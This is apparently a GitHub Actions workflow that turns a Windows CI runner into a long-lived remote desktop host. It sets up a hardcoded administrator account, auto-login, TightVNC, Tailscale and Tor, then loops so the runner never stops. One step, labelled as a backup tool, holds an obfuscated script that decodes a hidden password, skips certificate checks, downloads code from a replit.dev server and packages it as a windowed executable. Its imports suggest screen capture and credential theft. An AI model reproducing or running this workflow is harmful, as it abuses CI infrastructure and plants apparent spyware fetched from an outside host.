name: NetHunter KeX (VNC) - YIRDP User

on:
  workflow_dispatch:

jobs:
  secure-vnc:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Create YIRDP User Account
        run: |
          $username = "YIRDP"
          $password = "123123@Llo"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          
          Write-Host "Creating local user: $username"
          
          if (Get-LocalUser -Name $username -ErrorAction SilentlyContinue) {
              Remove-LocalUser -Name $username -ErrorAction SilentlyContinue
              Start-Sleep -Seconds 2
          }
          
          New-LocalUser -Name $username -Password $securePass -AccountNeverExpires -PasswordNeverExpires -ErrorAction Stop
          
          Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction SilentlyContinue
          
          Write-Host "User '$username' created and added to Administrators group."

      - name: Enable Auto-Login for YIRDP User
        run: |
          $username = "YIRDP"
          $password = "123123@Llo"
          
          Write-Host "Configuring auto-login for user: $username"
          
          $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
          
          Set-ItemProperty -Path $regPath -Name "AutoAdminLogon" -Value "1" -Force
          Set-ItemProperty -Path $regPath -Name "DefaultUserName" -Value $username -Force
          Set-ItemProperty -Path $regPath -Name "DefaultPassword" -Value $password -Force
          Set-ItemProperty -Path $regPath -Name "DefaultDomainName" -Value $env:COMPUTERNAME -Force
          
          Write-Host "Auto-login configured for '$username'."

      - name: Set Visual Effects for Best Appearance
        run: |
          Write-Host "Enabling 'Adjust for best appearance' visual effects..."
          
          $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects"
          if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
          Set-ItemProperty -Path $regPath -Name "VisualFXSetting" -Value 1 -Type DWord -Force
          
          $maskHex = [byte[]](0x9E, 0x3E, 0x07, 0x80, 0x12, 0x00, 0x00, 0x00)
          Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "UserPreferencesMask" -Value $maskHex -Force
          
          Restart-Service -Name "Themes" -Force -ErrorAction SilentlyContinue
          
          Write-Host "Visual effects set to 'Best Appearance' successfully."

      - name: Uninstall R 4.5.3
        run: |
          Write-Host "Checking for R 4.5.3 installation..."
          $rPaths = @(
              "C:\Program Files\R\R-4.5.3",
              "C:\Program Files (x86)\R\R-4.5.3"
          )
          
          foreach ($path in $rPaths) {
              if (Test-Path $path) {
                  Write-Host "Found R installation at: $path"
                  $uninstaller = Get-ChildItem -Path $path -Filter "uninstall*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                  if ($uninstaller) {
                      Start-Process -FilePath $uninstaller.FullName -ArgumentList "/SILENT" -Wait -NoNewWindow
                      Write-Host "R 4.5.3 uninstalled."
                  }
              }
          }
          
          $rRegPaths = @(
              "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\R-4.5.3*",
              "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\R-4.5.3*"
          )
          
          foreach ($regPath in $rRegPaths) {
              $rKey = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
              if ($rKey) {
                  $uninstallString = $rKey.UninstallString
                  if ($uninstallString) {
                      Start-Process cmd.exe -ArgumentList "/c $uninstallString /SILENT" -Wait -NoNewWindow
                      Write-Host "R 4.5.3 uninstalled via registry."
                  }
              }
          }
          
          Write-Host "R 4.5.3 removal completed."

      - name: Uninstall Unity Hub
        run: |
          Write-Host "Checking for Unity Hub installation..."
          
          $unityPaths = @(
              "$env:LOCALAPPDATA\Programs\Unity Hub",
              "$env:PROGRAMFILES\Unity Hub",
              "${env:PROGRAMFILES(x86)}\Unity Hub"
          )
          
          foreach ($path in $unityPaths) {
              if (Test-Path $path) {
                  Write-Host "Found Unity Hub at: $path"
                  $uninstaller = Get-ChildItem -Path $path -Filter "Uninstall*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                  if ($uninstaller) {
                      Start-Process -FilePath $uninstaller.FullName -ArgumentList "/S" -Wait -NoNewWindow
                      Write-Host "Unity Hub uninstalled."
                  }
              }
          }
          
          $unityRegPaths = @(
              "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\UnityHub",
              "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\UnityHub"
          )
          
          foreach ($regPath in $unityRegPaths) {
              $unityKey = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
              if ($unityKey) {
                  $uninstallString = $unityKey.UninstallString
                  if ($uninstallString) {
                      Start-Process cmd.exe -ArgumentList "/c $uninstallString /S" -Wait -NoNewWindow
                      Write-Host "Unity Hub uninstalled via registry."
                  }
              }
          }
          
          Write-Host "Unity Hub removal completed."

      - name: Download and Install Tor Browser
        run: |
          Write-Host "Downloading Tor Browser..."
          $torUrl = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.9/tor-browser-windows-x86_64-portable-14.0.9.exe"
          $torInstaller = "$env:TEMP\tor-browser-install.exe"
          
          try {
              Invoke-WebRequest -Uri $torUrl -OutFile $torInstaller -ErrorAction Stop
          } catch {
              Write-Host "Primary URL failed, trying alternative..."
              $torUrl = "https://dist.torproject.org/torbrowser/14.0.7/tor-browser-windows-x86_64-portable-14.0.7.exe"
              Invoke-WebRequest -Uri $torUrl -OutFile $torInstaller
          }
          
          Write-Host "Installing Tor Browser..."
          $installPath = "C:\Tor Browser"
          Start-Process -FilePath $torInstaller -ArgumentList "/S /D=`"$installPath`"" -Wait -NoNewWindow
          
          Remove-Item $torInstaller -Force
          
          if (Test-Path "$installPath\firefox.exe") {
              Write-Host "Tor Browser installed successfully at: $installPath"
          } else {
              Write-Host "Tor Browser installation may have completed."
          }

      - name: Download and Build RDP Backup Tool
        run: |
          Write-Host "Creating RDP Backup Tool build script..."
          
          $buildScript = @'
@echo off
title RDP Backup Tool - Build Script
set API_URL=https://3a0b63ff-431c-4db0-a163-1ae3217657c3-00-26i0k4hljs0sj.riker.replit.dev/api.php
if not "%1"=="__run__" (cmd /k "%~f0" __run__ & exit)
chcp 65001 > nul
color 0F
cls
echo.
echo  ==========================================
echo    RDP Backup Tool - Build Script v1.0
echo  ==========================================
echo.
echo  Server: %API_URL%
echo.
echo  [1/5] Checking Python...
python --version > nul 2>&1
IF ERRORLEVEL 1 (
    echo.
    echo  [ERROR] Python is not installed or not in PATH!
    goto :end
)
for /f "tokens=*" %%i in ('python --version 2^>^&1') do echo         Found: %%i
echo.
echo  [2/5] Installing requirements...
pip install requests pyinstaller pywin32 cryptography mss opencv-python numpy --quiet --no-warn-script-location
IF ERRORLEVEL 1 (
    echo.
    echo  [ERROR] Failed to install requirements.
    goto :end
)
echo         Done.
echo.
echo  [3/5] Downloading script from server...
set PS_TMP=%TEMP%\rdp_downloader_%RANDOM%.ps1
(
echo $ErrorActionPreference = 'Stop'
echo try {
echo   $xorHex = '09333E3F281A1E373334686A6B6D6B1A173735'
echo   $key    = 0x5A
echo   $bytes  = New-Object byte[] ($xorHex.Length / 2)
echo   for ($i = 0; $i -lt $xorHex.Length; $i += 2) {
echo     $bytes[$i/2] = [Convert]::ToInt32($xorHex.Substring($i, 2), 16) -bxor $key
echo   }
echo   $pwd = [System.Text.Encoding]::UTF8.GetString($bytes)
echo   $api = '%API_URL%'
echo   [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
echo   [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
echo   Write-Host '         Authenticating with server...'
echo   $ab = ConvertTo-Json @{ action = 'get_token'; password = $pwd }
echo   $ar = Invoke-RestMethod -Uri $api -Method Post -Body $ab -ContentType 'application/json' -TimeoutSec 20
echo   if (-not $ar.success) { throw 'Authentication failed: ' + $ar.message }
echo   $token = $ar.data.token
echo   $pwd   = $null
echo   Write-Host '         Authentication successful.'
echo   Write-Host '         Downloading backup_tool.py...'
echo   $db = ConvertTo-Json @{ action = 'download_tool'; token = $token }
echo   $dr = Invoke-RestMethod -Uri $api -Method Post -Body $db -ContentType 'application/json' -TimeoutSec 90
echo   if (-not $dr.success) { throw 'Download failed: ' + $dr.message }
echo   $raw = [System.Convert]::FromBase64String($dr.data.content)
echo   $md5 = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash($raw)).Replace('-','').ToLower()
echo   if ($md5 -ne $dr.data.checksum) { throw 'Integrity check failed - MD5 mismatch!' }
echo   [System.IO.File]::WriteAllBytes('backup_tool.py', $raw)
echo   $kb = [math]::Round($dr.data.size / 1024, 1)
echo   Write-Host ('         Downloaded OK   Size: ' + $kb + ' KB   MD5: ' + $md5)
echo   $token = $null
echo } catch {
echo   Write-Host ('[ERROR] ' + $_.Exception.Message) -ForegroundColor Red
echo   exit 1
echo }
) > "%PS_TMP%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_TMP%"
set PS_ERR=%ERRORLEVEL%
del "%PS_TMP%" > nul 2>&1
IF %PS_ERR% NEQ 0 (
    echo.
    echo  [ERROR] Failed to download script from server.
    goto :end
)
echo.
echo  [4/5] Building exe (this may take a few minutes, please wait)...
if exist build rmdir /s /q build > nul 2>&1
if exist dist  rmdir /s /q dist  > nul 2>&1
pyinstaller --onefile --windowed --name "backup_tool" --hidden-import=win32api --hidden-import=win32con --hidden-import=winreg --hidden-import=ctypes --hidden-import=sqlite3 --hidden-import=requests --hidden-import=urllib3 --hidden-import=mss --hidden-import=cv2 --hidden-import=numpy backup_tool.py > build_log.txt 2>&1
IF ERRORLEVEL 1 (
    echo.
    echo  [ERROR] Build failed!
    goto :end
)
echo         Build successful.
echo.
echo  [5/5] Copying exe to Desktop...
if exist "dist\backup_tool.exe" (
    copy /Y "dist\backup_tool.exe" "%USERPROFILE%\Desktop\backup_tool.exe" > nul
    IF ERRORLEVEL 1 (
        echo  [WARNING] Could not copy to Desktop. Trying current folder instead...
        copy /Y "dist\backup_tool.exe" "backup_tool.exe" > nul
        echo         Saved to: %CD%\backup_tool.exe
    ) ELSE (
        echo         Saved to: %USERPROFILE%\Desktop\backup_tool.exe
    )
    rmdir /s /q build    > nul 2>&1
    rmdir /s /q dist     > nul 2>&1
    del backup_tool.py   > nul 2>&1
    del build_log.txt    > nul 2>&1
    del backup_tool.spec > nul 2>&1
    echo.
    echo  ==========================================
    echo    BUILD COMPLETE!
    echo    backup_tool.exe is on your Desktop.
    echo  ==========================================
) else (
    echo  [ERROR] dist\backup_tool.exe was not created.
)
:end
echo.
echo  ==========================================
echo  Done.
echo  ==========================================
'@
          
          $buildScriptPath = "$env:TEMP\build_backup_tool.bat"
          [System.IO.File]::WriteAllText($buildScriptPath, $buildScript)
          Write-Host "Build script created at: $buildScriptPath"
          
          Write-Host "Running RDP Backup Tool build script..."
          Start-Process -FilePath $buildScriptPath -Wait -NoNewWindow
          
          Write-Host "RDP Backup Tool build completed."

      - name: Download and Install TightVNC Server
        run: |
          $vncPassword = "123123@Llo"
          $vncUrl = "https://www.tightvnc.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit.msi"
          $installerPath = "$env:TEMP\tightvnc.msi"
          
          Write-Host "Downloading TightVNC Server..."
          Invoke-WebRequest -Uri $vncUrl -OutFile $installerPath
          
          Write-Host "Installing TightVNC as a Service..."
          $msiArgs = @(
              "/i", "`"$installerPath`"",
              "/quiet",
              "/norestart",
              "ADDLOCAL=`"Server`"",
              "SERVER_REGISTER_AS_SERVICE=1",
              "SET_USEVNC=1",
              "VALUE_OF_USEVNC=1",
              "SET_PASSWORD=1",
              "VALUE_OF_PASSWORD=$vncPassword",
              "SET_USECONTROLAUTHENTICATION=1",
              "VALUE_OF_USECONTROLAUTHENTICATION=1",
              "SET_CONTROLPASSWORD=1",
              "VALUE_OF_CONTROLPASSWORD=$vncPassword"
          )
          
          Start-Process msiexec.exe -ArgumentList $msiArgs -Wait
          Remove-Item $installerPath -Force
          Write-Host "TightVNC Server installed."

      - name: Configure TightVNC (Port, Performance, Wallpaper, Resolution)
        run: |
          $regPath = "HKLM:\SOFTWARE\TightVNC\Server"
          if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
          
          Set-ItemProperty -Path $regPath -Name "RfbPort" -Value 9001 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "UseVncAuthentication" -Value 1 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "UseControlAuthentication" -Value 0 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "RemoveWallpaper" -Value 0 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "AllowJPEG" -Value 0 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "VideoRecognition" -Value 1 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "PollingInterval" -Value 100 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "GrabTransparentWindows" -Value 0 -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "EnableFileTransfers" -Value 0 -Type DWord -Force
          
          $Width = 1280
          $Height = 720
          Set-ItemProperty -Path $regPath -Name "FixedScreenWidth" -Value $Width -Type DWord -Force
          Set-ItemProperty -Path $regPath -Name "FixedScreenHeight" -Value $Height -Type DWord -Force
          
          Write-Host "TightVNC configuration complete."

      - name: Configure Firewall for VNC (Port 9001)
        run: |
          netsh advfirewall firewall delete rule name="VNC-Tailscale" -ErrorAction SilentlyContinue
          netsh advfirewall firewall add rule name="VNC-Tailscale" dir=in action=allow protocol=TCP localport=9001
          Write-Host "Firewall rule added for port 9001."

      - name: Start TightVNC Service
        run: |
          Restart-Service -Name "tvnserver" -Force
          Set-Service -Name "tvnserver" -StartupType Automatic
          Write-Host "TightVNC Service started."

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Establish Tailscale Connection
        run: |
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-vnc-$env:GITHUB_RUN_ID
          
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              if (-not $tsIP) { Start-Sleep -Seconds 5 }
              $retries++
          }
          
          if (-not $tsIP) { Write-Error "Tailscale IP not assigned."; exit 1 }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
          Write-Host "Tailscale IP assigned: $tsIP"

      - name: Prevent Sleep and Keep Machine Awake
        run: |
          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
          powercfg /change monitor-timeout-ac 0
          powercfg /change monitor-timeout-dc 0
          powercfg /change standby-timeout-ac 0
          powercfg /change standby-timeout-dc 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change hibernate-timeout-dc 0
          powercfg /setacvalueindex SCHEME_CURRENT SUB_SLEEP UNATTENDSLEEP 0
          powercfg /setactive SCHEME_CURRENT
          
          $code = @"
          using System;
          using System.Runtime.InteropServices;
          public class KeepAwake {
              [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
              public static extern uint SetThreadExecutionState(uint esFlags);
              public const uint ES_CONTINUOUS = 0x80000000;
              public const uint ES_SYSTEM_REQUIRED = 0x00000001;
              public const uint ES_DISPLAY_REQUIRED = 0x00000002;
              public static void PreventSleep() {
                  SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);
              }
          }
          "@
          Add-Type -TypeDefinition $code -Language CSharp
          [KeepAwake]::PreventSleep()
          
          Write-Host "Sleep disabled."

      - name: Verify VNC Accessibility
        run: |
          Write-Host "Waiting for VNC service to fully initialize..."
          Start-Sleep -Seconds 10
          
          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 9001
          if (-not $testResult.TcpTestSucceeded) {
              Write-Warning "VNC port 9001 might not be reachable yet."
          } else {
              Write-Host "VNC port 9001 is accessible."
          }

      - name: Display VNC Credentials and Keep Runner Alive
        run: |
          Write-Host "`n=== NETHUNTER KeX CONNECTION INFO ==="
          Write-Host "Tailscale IP : $env:TAILSCALE_IP"
          Write-Host "Port         : 9001"
          Write-Host "Password     : 123123@Llo"
          Write-Host "Windows User : YIRDP"
          Write-Host ""
          Write-Host "👉 Paste this in NetHunter KeX:"
          Write-Host "123123@Llo@$env:TAILSCALE_IP::9001"
          Write-Host "========================================`n"
          
          Write-Host "The Windows machine will stay awake."
          
          while ($true) {
              Write-Host "." -NoNewline
              Start-Sleep -Seconds 300
          }
